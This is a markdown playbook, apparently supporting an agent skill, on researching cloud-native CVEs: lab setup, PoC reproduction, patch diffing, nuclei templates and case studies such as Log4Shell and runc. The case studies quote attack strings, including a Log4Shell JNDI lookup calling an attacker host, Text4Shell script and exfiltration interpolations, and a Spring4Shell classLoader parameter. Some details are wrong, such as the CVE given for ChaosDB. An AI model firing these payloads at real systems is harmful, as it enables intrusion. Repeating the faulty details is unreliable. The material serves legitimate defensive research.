# Cloud-Native Vulnerability Research Playbook — End-to-End CVE Research Workflow

> Deep-dive companion to `skills/cloud-native-vuln-research/SKILL.md`.
>
> Audience: security researchers, red team operators, and vulnerability analysts who need a battle-tested methodology for triaging cloud-native CVEs, reproducing them safely, diffing the patch, authoring nuclei templates, and composing multi-CVE exploit chains.

---

## Introduction

Cloud-native vulnerability research is not generic CVE work. The surface (containers, k8s, service mesh, managed cloud services) generates a continuous stream of CVEs whose patch gap is measured in months and whose exploit-public gap is measured in days. The researcher who turns a newly-disclosed CVE into a reproducible PoC, a nuclei template, and a piece of a larger exploit chain narrative — in the time between disclosure and mass exploitation — is the researcher who shifts an organization's posture from reactive to predictive.

This playbook walks through the full research lifecycle: triage (does this CVE matter?), lab build (how do I safely reproduce it?), PoC reproduction (can I trigger the bug?), patch diff (what's the root cause?), nuclei template authoring (how do I let others detect it?), and exploit chain composition (how does this CVE compose with adjacent primitives?). It closes with real-world case studies — Log4Shell, Spring4Shell, Text4Shell, Chaos DB, OMIGOD, Codecov, Dirty Pipe, and the runc escape — that illustrate the methodology in action.

---

## CVE Research Methodology

### The five-phase workflow

Every CVE you triage goes through the same five phases. Skipping a phase produces incomplete research.

1. **Triage & Scoring** — Pull the NVD record, CVSS v3.1 base + vector (and CVSS v4.0 if available, which supplements with exploitability metrics). Check CISA KEV (is it known-exploited?). Pull EPSS (probability of exploitation in next 30 days). Check exploit availability (searchsploit, sploitus, vulners, GitHub). Filter for cloud-native relevance (keyword match against CNCF landscape + cloud provider services). Output: a triage card with severity, exploitability, relevance, and a go/no-go on PoC reproduction investment.

2. **Lab Environment Build** — Never reproduce a PoC against anything other than an isolated lab. For container CVEs, use Docker with a snapshot-rollback workflow (or Podman rootless). For k8s CVEs, use kind (fast spin-up, multi-node), minikube (single-node, mature drivers), or k3d (k3s in Docker, ARM64-friendly). For multi-arch CVEs, use QEMU with binfmt_misc. For kernel CVEs, use a QEMU VM with the vulnerable kernel. Always snapshot the lab state before the PoC so rollback is one command. Always use `--network internal` to block outbound internet from the lab.

3. **PoC Reproduction** — Pull the public PoC (GitHub repo, exploitdb entry, blog write-up), adapt it to the lab, run it, capture evidence (logs, packet capture, memory dump if relevant). If the PoC fails, instrument and debug — many published PoCs target specific configurations or have undocumented prerequisites. If no public PoC exists, attempt to build one from the patch diff (Phase 4) — this is the highest-value research output because it's a novel contribution.

4. **Patch Diff Analysis** — Pull the upstream fix (`git log v1..v2 -- src/`, `git diff v1..v2 -- src/`), read the GitHub Advisory (`gh advisory view GHSA-xxxx-xxxx-xxxx`), and (for binary-only patches) use BinDiff or Diaphora to identify the changed function. The patch diff answers: what's the root cause? what's the minimal detection signature? what other versions might be affected? Output: a root-cause write-up, a Yara rule or Suricata signature, and (where applicable) a nuclei template.

5. **Exploit Chain Composition** — Rarely is a single CVE the full story. Take the reproduced PoC and compose it with adjacent primitives: SSRF → IMDSv1 → cloud role exfil → kubelet on a worker node → kubelet RCE → pod on the node → container escape via CVE-2022-0185 → node root. The chain demonstrates real-world impact and informs the patch-priority and detection-strategy conversations.

### Triage card template

```markdown
# CVE-2026-21858 Triage Card

## Severity
- CVSS v3.1: 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
- CVSS v4.0: n/a (not yet published)
- CISA KEV: not listed (as of 2026-06-21)
- EPSS: 0.34 (74th percentile)

## Cloud-Native Relevance
- Component: Acme Web UI (runs in containers, common in k8s deployments)
- Affected versions: < 3.4.2
- Fixed version: 3.4.2 (released 2026-04-12)
- Patch lag in our fleet: avg 45 days (our images still on 3.4.0)

## Exploit Availability
- Public PoC: yes (https://github.com/example/CVE-2026-21858)
- Exploit maturity: functional
- Active exploitation: none reported

## Decision
GO — reproduce in lab, author nuclei template, draft advisory.
```

---

## Building a Reproduction Lab

### Container labs (Docker / Podman)

The Docker snapshot-rollback workflow is the most common lab pattern because most cloud-native CVEs reproduce in a single container.

```bash
# Create an isolated network
docker network create --internal lab-iso-net

# Run the vulnerable image
docker run -d --name lab-vuln --network lab-iso-net -p 127.0.0.1:8080:8080 vuln/target:1.0

# Snapshot before PoC
docker commit lab-vuln lab-vuln:pre-poc

# Run the PoC
curl -H 'Payload: ...' http://127.0.0.1:8080/

# Rollback
docker stop lab-vuln && docker rm lab-vuln
docker run -d --name lab-vuln --network lab-iso-net -p 127.0.0.1:8080:8080 lab-vuln:pre-poc
```

For rootless reproduction (e.g. when the PoC requires `--privileged` but you want isolation from the host), use Podman:

```bash
podman run --rm -it --privileged vuln/target:1.0 bash
```

### Kubernetes labs (kind, minikube, k3d)

For k8s CVEs (API server, kubelet, RBAC, etc.), use a local cluster.

```bash
# kind — fastest, multi-node, great for CVE reproduction at specific versions
kind create cluster --image kindest/node:v1.22.9 --name vuln-k8s
kubectl version --short

# minikube — single-node, mature drivers, good for addon CVEs
minikube start --kubernetes-version=v1.22.0 --driver=docker

# k3d — k3s in Docker, lightweight, ARM64-friendly
k3d cluster create vuln --agents 2 --image rancher/k3s:v1.22.5-k3s1
```

For CVEs that require a specific node configuration (e.g. CAP_SYS_ADMIN on a vulnerable kernel), use kind with a custom node image or boot a QEMU VM at the vulnerable kernel version and run k3s on it.

### Multi-arch labs (QEMU + binfmt)

For CVEs that affect ARM64 or other non-x86 architectures, use QEMU with binfmt_misc to run foreign-architecture containers on x86 (and vice versa).

```bash
sudo apt install -y qemu-system qemu-user-static binfmt-support
docker run --rm --privileged multiarch/qemu-user-static --reset -p yes

# Verify
docker run --rm --platform linux/arm64 alpine uname -m
# Expected: aarch64

# Reproduce an ARM64-only CVE
docker run --rm --platform linux/arm64 vuln/target:arm64-1.0
```

### Snapshot / rollback discipline

The cardinal rule of CVE reproduction: **snapshot before the PoC**. Without a snapshot, you can't cleanly re-run the PoC, you can't diff pre/post state, and you can't guarantee the lab is clean for the next CVE.

- Docker: `docker commit <container> <image>:pre-poc` before the PoC.
- kind: kind nodes are Docker containers; `docker commit` the node container.
- QEMU VMs: use `qemu-img snapshot -c pre-poc disk.qcow2`.
- minikube: `minikube ssh -- sudo cp -r /var/lib/minikube /tmp/snapshot`.

### Network isolation guard

Always verify the lab has no outbound internet. A misconfigured lab that can reach the public internet is a risk to the wider organization if the PoC exfiltrates data, joins a botnet, or triggers an external IDS.

```bash
# Docker: --internal flag on the bridge network
docker network create --internal lab-iso-net

# Verify
docker exec lab-vuln sh -c 'curl -m 3 https://example.com || echo "outbound blocked"'
```

---

## nuclei Template Ecosystem

### projectdiscovery/nuclei-templates

[projectdiscovery/nuclei-templates](https://github.com/projectdiscovery/nuclei-templates) (12.6k stars, 3.5k forks as of April 2026) is the de-facto community library for "does this target have CVE-X". The repo contains 9000+ YAML templates organized by category: `cves/<year>/`, `exposures/`, `misconfiguration/`, `default-logins/`, `dns/`, `network/`, `workflows/`, and others. Every template is CI-tested with `nuclei -validate`; every PR is reviewed by maintainers.

### Template structure

A nuclei template has three required sections: `id` (unique identifier, usually the CVE ID), `info` (metadata: name, author, severity, description, references, classification, tags), and a protocol section (`http`, `dns`, `network`, `tcp`, `workflow`). See `payloads.md §6` for full schema examples.

### Contribution workflow

The contribution workflow is documented in [the repo's CONTRIBUTING.md](https://github.com/projectdiscovery/nuclei-templates/blob/main/CONTRIBUTING.md), but the practical steps are:

1. Fork the repo on GitHub.
2. Clone your fork: `git clone https://github.com/<your-gh>/nuclei-templates`.
3. Branch from upstream/main: `git checkout -b add-CVE-2026-21858 upstream/main`.
4. Place the template: `cves/2026/CVE-2026-21858.yaml`.
5. Validate locally: `nuclei -validate -t cves/2026/CVE-2026-21858.yaml`.
6. Test against vuln and patched targets (your lab).
7. Commit, push, open PR.
8. Respond to maintainer review.

### April 2026 release: AI/LLM templates

The April 2026 release of nuclei-templates (v10.0.0) added deep KEV coverage and a new category of AI/LLM attack templates — covering prompt injection, model exfiltration, and vector DB exposure. These templates live under `exposures/ai/` and `http/cves/2026/` and are particularly useful for assessing deployments of managed LLM endpoints (OpenAI, Anthropic, Cohere, Azure OpenAI, AWS Bedrock).

```bash
nuclei -update-templates
ls ~/nuclei-templates/http/exposures/ai/ | head
nuclei -t ~/nuclei-templates/http/exposures/ai/ -u https://llm-target.local
```

### CI / false positive triage

The projectdiscovery CI runs `nuclei -validate` on every PR. Templates that produce false positives are flagged by maintainers and users; the contributor is expected to tighten matchers. The standard tightening pattern is:

- Switch `matchers-condition: or` to `matchers-condition: and` (require all matchers).
- Add a second unique string from the vulnerable response.
- Restrict status codes (e.g. only `200`, not `200, 301, 302`).
- Use `dsl` matchers for complex logic (`status_code == 200 && contains(body, "...") && !contains(body, "...patched-marker...")`).

---

## Real-World Case Studies

### Log4Shell (CVE-2021-44228)

**Timeline**: Disclosed 2021-11-24 (privately to Apache); publicly disclosed 2021-12-09. Mass exploitation began within hours of public disclosure. CVSS 10.0.

**Technical detail**: Apache log4j-core 2.0–2.14.1 performed JNDI lookups embedded in log messages. An attacker who could submit a string like `${jndi:ldap://attacker/Basic/Command/Base64/<b64>}` to any code path that logged the string — HTTP headers (User-Agent, X-Api-Version), form fields, URI parameters, LDAP attributes, Minecraft chat messages — triggered log4j to make an outbound LDAP query to attacker-controlled infrastructure. The LDAP server responded with a Java class reference; the JVM fetched the class and executed its static initializer. Result: remote code execution as the JVM user.

**Impact**: Mass exploitation across every Java application that (transitively) depended on log4j-core. The Mirai botnet added Log4Shell to its propagation vectors within 24 hours. VMware Horizon, Cisco, AWS, Minecraft servers, and tens of thousands of enterprise apps were compromised. The full remediation took years because log4j was a transitive dependency in millions of build trees.

**Researcher lessons**: (1) Always test the full log vector — headers, body, URI, downstream-app fields (LDAP, DB columns that get logged). (2) The `${jndi:...}` lookup had been a "feature" of log4j since 2013; the bug was in the threat model, not the implementation. (3) The patch (2.15.0) disabled JNDI lookups by default, but introduced CVE-2021-45046 (DoS) which was fixed in 2.16.0, which was itself found vulnerable to CVE-2021-45105 (DoS via recursive lookup) fixed in 2.17.0 — three rounds of patches. Always test the patch.

### Spring4Shell (CVE-2022-22965)

**Timeline**: Disclosed 2022-03-31. Mass exploitation began 2022-04-01. CVSS 9.8.

**Technical detail**: Spring Framework < 5.3.18, 5.2.20 had a class-loader manipulation flaw in the `WebDataBinder`. An attacker who could submit a crafted request like `class.module.classLoader.resources.context.parent.pipeline.first.pattern=...` could write an arbitrary file (typically a JSP webshell) to the web root. The vulnerability required Java 9+ (module system) and Spring on Tomcat as a WAR (not the common Spring Boot embedded Tomcat).

**Impact**: Less severe than Log4Shell because of the narrower deployment target (WAR on Java 9+), but still widely exploited. Mass scanning for the Tomcat AccessLog valve manipulation variant began within hours.

**Researcher lessons**: (1) The CVE write-ups varied widely in accuracy — some claimed it affected all Spring deployments, others only Tomcat WAR. The patch diff was the authoritative source: the fix added a `disallowedFields` blocklist for `class.*`, `*.class.*`, `*.classLoader.*`. (2) Always check the disclosure timeline — Spring's initial advisory was vague, leading to widespread speculation; the detailed advisory came 24h later.

### Text4Shell (CVE-2022-42889)

**Timeline**: Disclosed 2022-10-13. CVSS 9.8.

**Technical detail**: Apache Commons Text < 1.10.0 had a `StringSubstitutor` lookup API that supported three dangerous interpolations: `${script:javascript:...}` (Nashorn script execution), `${dns:addr|host.example.com}` (DNS lookup, useful for data exfiltration), and `${url:utf-8:http://host/path}` (HTTP fetch). Any application that passed user input to `StringSubstitutor.replace()` was vulnerable to RCE.

**Impact**: Less severe than Log4Shell because Commons Text was less commonly in the hot path of logging, but still affected several high-profile libraries.

**Researcher lessons**: (1) Same pattern as Log4Shell — a "feature" that interpolated user input was a bug waiting to happen. (2) The patch simply removed the three dangerous default lookups. (3) Always grep your codebase for `StringSubstitutor` usage after a CVE in Commons Text.

### Chaos DB (CVE-2021-42306)

**Timeline**: Disclosed 2021-08-26 (by Wiz Research). CVSS 9.8.

**Technical detail**: Azure Cosmos DB had a Jupyter Notebooks feature that, when enabled, created a notebook container with access to the customer's Cosmos DB credentials. The notebook's network was misconfigured such that one customer could access another customer's notebook (and therefore their credentials). The vulnerability was in the Cosmos DB service itself — no customer-side patch was possible.

**Impact**: Wiz Research estimated that thousands of Cosmos DB customers were potentially exposed. Microsoft rotated credentials for all affected accounts.

**Researcher lessons**: (1) For cloud-managed service CVEs, the "patch" is waiting for the cloud provider — there's no customer-side remediation beyond rotating credentials and auditing access logs. (2) Detection shifts to virtual patching (WAF rules, network segmentation) and post-incident forensics. (3) The vulnerability class — Notebook-as-a-service with shared networking — is broader than Cosmos DB; assess other managed notebook services.

### OMIGOD (CVE-2021-38645 et al.)

**Timeline**: Disclosed 2021-09-14 (by Wiz Research). CVSS 9.8.

**Technical detail**: Azure's Open Management Infrastructure (OMI) agent, installed by default on many Azure Linux VMs, exposed an HTTP listener on TCP 5985 (OMI HTTP) or 5986 (OMI HTTPS). The listener accepted WS-Management SOAP requests without authentication for several operations, including `ExecuteShellCommand`. An attacker who could reach port 5985 on an affected VM could execute arbitrary commands as root.

**Impact**: Wiz estimated that "thousands" of Azure VMs had the listener exposed to the internet. Microsoft pushed an automated patch within days.

**Researcher lessons**: (1) Managed agents are a frequent source of cloud VM CVEs — always enumerate the listeners on a managed-agent-installed VM. (2) The SOAP/WSDL attack surface is unusual in modern web-app pentesting; the Wiz writeup is an excellent reference. (3) Network segmentation (NSGs blocking 5985/5986 from the internet) is a critical compensating control when the agent patch isn't yet rolled out.

### Codecov bash uploader compromise (2021)

**Timeline**: Attacker modified the bash uploader on 2021-01-31; compromise discovered 2021-04-01.

**Technical detail**: Codecov's `bash <(curl -s https://codecov.io/bash)` uploader was a widely-used CI snippet that piped a remote bash script into `bash`. An attacker gained write access to the bash script on Codecov's CDN and added a section that exfiltrated the CI environment variables (including tokens, secrets, cloud credentials) to an attacker-controlled server. The modification went undetected for two months.

**Impact**: Hundreds of organizations had CI secrets exfiltrated. Twilio, HashiCorp, Rapid7, and others publicly disclosed impact.

**Researcher lessons**: (1) The supply-chain class of CVE doesn't have a CVE ID — it's a class, not a single vuln. (2) SBOM-driven inventory is the only way to answer "are we affected" for a compromised dependency. (3) The `bash <(curl ...)` anti-pattern remains widespread; grep your CI for it.

### Dirty Pipe (CVE-2022-0847)

**Timeline**: Disclosed 2022-03-07 (by Max Kellermann). CVSS 7.8.

**Technical detail**: Linux kernel 5.8–5.16.10 (and 5.15.24–5.16.10) had a flaw in the pipe buffer initialization that let a local user overwrite the contents of arbitrary read-only files (including `/etc/passwd`, SUID binaries, and the host's `/proc/self/exe` from inside a container). The exploit was simple (~100 lines of C), reliable, and required no special capabilities — only a regular user shell.

**Impact**: LPE on every affected host; container escape variant (overwrite `/proc/self/exe` = host runc) broke out of containers.

**Researcher lessons**: (1) The researcher's writeup is a master class in clear CVE communication — a single blog post explaining the root cause, the impact, and the fix. (2) Container escape isn't always a kernel "escape" primitive — sometimes it's a file-overwrite primitive that happens to target the host's runtime binary. (3) The 5.8 regression window (the bug was introduced in 5.8, fixed in 5.16.11) meant that every long-running fleet had affected hosts; patch lag was the dominant exposure metric.

### runc escape (CVE-2019-5736)

**Timeline**: Disclosed 2019-02-11 (by Adam Iwaniuk and Borys Popławski). CVSS 8.6.

**Technical detail**: runc, the OCI container runtime invoked by Docker/containerd, used `execve("/proc/self/exe")` to spawn processes inside containers. The `/proc/self/exe` symlink pointed to the host's runc binary on the host filesystem. A malicious container that knew when an `exec` was about to happen could overwrite `/proc/self/exe` (the host's runc binary) with attacker-controlled code, so that the next `docker exec` invocation on any container on that host executed attacker code as host root.

**Impact**: Any container that could trigger a `docker exec` (or any container runtime that used runc) on an unpatched host could escape to host root.

**Researcher lessons**: (1) The CVE class — "the runtime binary is writable from inside the container" — recurs periodically; the same primitive affected later versions of containerd. (2) The fix was to use a read-only bind-mount of the runc binary, not a behavior change — a defensive design rather than a logical patch. (3) Reproducing the PoC requires precise timing (overwrite the binary in the window between `execve` and the new process's startup); instrument carefully.

---

## KEV-Driven Prioritization

### The CISA KEV catalog

The CISA Known Exploited Vulnerabilities (KEV) catalog (<https://www.cisa.gov/known-exploited-vulnerabilities-catalog>) is the authoritative list of CVEs with confirmed in-the-wild exploitation. Federal agencies are bound by a BOD (Binding Operational Directive) to patch KEV-listed CVEs within the published due-date (typically 14–21 days from listing). The private sector widely adopts the KEV catalog as a prioritization baseline.

### EPSS (Exploit Prediction Scoring System)

EPSS (<https://www.first.org/epss/>) is a probability score (0.0–1.0) for the likelihood that a given CVE will be exploited in the wild within the next 30 days. EPSS is produced daily by a model trained on NVD data + observed exploitation data. EPSS complements CVSS: CVSS measures severity (if exploited, how bad), EPSS measures likelihood (will it be exploited). Together they form the modern prioritization matrix.

### CVSS v4.0

CVSS v4.0 (released November 2023, gradually adopted through 2025–2026) supplements the v3.1 base score with exploitability metrics (attack requirements, attack complexity beyond v3.1's coarse AC:L/H), impact metrics split per CIA, and supplemental environmental metrics. As of 2026, CVSS v4.0 is published alongside v3.1 for many CVEs; the v4.0 score is more precise but harder to compare to historical baselines.

### The prioritization matrix

Combine KEV, EPSS, CVSS, and exposure data into a prioritization matrix:

| KEV-listed | EPSS | Network-exposed | Priority | SLA |
|------------|------|------------------|----------|-----|
| Yes | (any) | (any) | P0 | CISA due-date (typically 14–21 days) |
| No | > 0.5 | Yes | P1 | 30 days |
| No | > 0.5 | No | P2 | 60 days |
| No | 0.05–0.5 | Yes | P2 | 60 days |
| No | 0.05–0.5 | No | P3 | Scheduled |
| No | < 0.05 | No | P4 | Scheduled |

### Automation

Automate the daily KEV pull, the cloud-native keyword filter, the SBOM cross-reference, and the EPSS enrichment as a daily cron job or systemd timer. The output is a triage report that's reviewed by the vulnerability management team. See `payloads.md §15` and `test-cases.md TC-CV-011` for the implementation.

---

## References

### Tooling

- ProjectDiscovery Nuclei: <https://github.com/projectdiscovery/nuclei>
- ProjectDiscovery nuclei-templates (April 2026 v10.0.0 release): <https://github.com/projectdiscovery/nuclei-templates/releases/tag/v10.0.0>
- Anchore Syft: <https://github.com/anchore/syft>
- Anchore Grype: <https://github.com/anchore/grype>
- Aqua Trivy: <https://github.com/aquasecurity/trivy>
- Google osv-scanner: <https://github.com/google/osv-scanner>
- Aqua kube-bench: <https://github.com/aquasecurity/kube-bench>
- Aqua kube-hunter: <https://github.com/aquasecurity/kube-hunter>
- InGuardians peirates: <https://github.com/inguardians/peirates>

### Feeds & catalogs

- CISA Known Exploited Vulnerabilities Catalog: <https://www.cisa.gov/known-exploited-vulnerabilities-catalog>
- NIST National Vulnerability Database: <https://nvd.nist.gov/>
- GitHub Security Advisory Database: <https://github.com/advisories>
- OSV.dev: <https://osv.dev/>
- FIRST EPSS: <https://www.first.org/epss/>
- Ubuntu Security Notices: <https://usn.ubuntu.com/>
- Debian Security Advisories: <https://www.debian.org/security/>

### Research blogs and write-ups

- Wiz Research OMIGOD write-up: <https://www.wiz.io/blog/omigod-critical-vulnerabilities-in-omi-azure>
- Wiz Research Chaos DB write-up: <https://www.wiz.io/blog/chaosdb-explained-azures-cosmos-db-vulnerability>
- Max Kellermann Dirty Pipe write-up: <https://dirtypipe.cm4all.com/>
- Codecov compromise post-mortem: <https://about.codecov.io/security-update/>
- ProjectDiscovery blog: <https://blog.projectdiscovery.io/>

### Standards & frameworks

- CNCF Security TAG: <https://github.com/cncf/tag-security>
- NIST SP 800-53 (Security Controls): <https://csrc.nist.gov/projects/cprt/catalog/sp/800-53>
- MITRE ATT&CK for Containers: <https://attack.mitre.org/matrices/enterprise/containers/>
- SPDX Specification: <https://spdx.github.io/spdx-spec/>
- CycloneDX Specification: <https://cyclonedx.org/specification/overview/>
